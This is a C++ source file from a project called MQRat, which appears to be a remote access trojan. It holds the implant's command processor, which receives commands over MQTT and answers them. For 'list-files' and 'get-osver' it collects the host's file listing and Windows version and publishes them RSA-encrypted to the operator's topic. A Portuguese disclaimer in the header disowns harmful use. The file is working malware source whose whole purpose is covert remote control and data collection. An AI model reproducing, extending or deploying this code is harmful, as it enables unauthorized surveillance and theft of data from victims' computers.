/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <exception>
#include <string>
#include <openssl/rsa.h>
#include <stdexcept>
#include "command_processor.hpp"
#include "api.hpp"
#include "log.hpp"
#include "mqtt_client.hpp"
#include "utils.hpp"
#include "crypto.hpp"
#include "encoders/base64.hpp"

using namespace Crypto;

#define CMDLEN_PAYLOAD_SIZE 3

CommandProcessor::CommandProcessor(string cmd, void *client)
{
    this->command = cmd;
    this->client = client;
    this->public_key_len = 0;
}

void CommandProcessor::Process()
{
    RSA *rsa = nullptr;
    auto client = static_cast<MqttClient*>(this->client);
    auto send_topic = client->getSendTopic();
    auto cipher = client->getCipher();

    try 
    {
        // Load public key from disk
        this->public_key = client->GetKeyManager()->ReadPublicKey();

        // Load public key into memory
        rsa = (RSA*)cipher->LoadPublicKey(this->public_key.c_str(), this->public_key.length());
    
        // Process command
        if(command == "list-files") 
        {
            auto files = API::FileSystem::ListFiles();
            client->PublishEncrypted(files, send_topic);
        } else if(command == "get-osver") 
        {
            auto version = API::FileSystem::GetWindowsVersion();
            client->PublishEncrypted(version, send_topic);
        } else 
        {
            client->SendError();
            Log::LogInfo("Unknown command received");
        }

    } catch(std::runtime_error& e) {
        Log::LogError(string("Something goes wrong: ") + e.what());
        client->SendError();
        goto free_resources;
    }

free_resources:
    Log::LogInfo("Releasing resources");

    if(rsa != nullptr) {
        // Free resources
        RSA_free(rsa);
    }
}
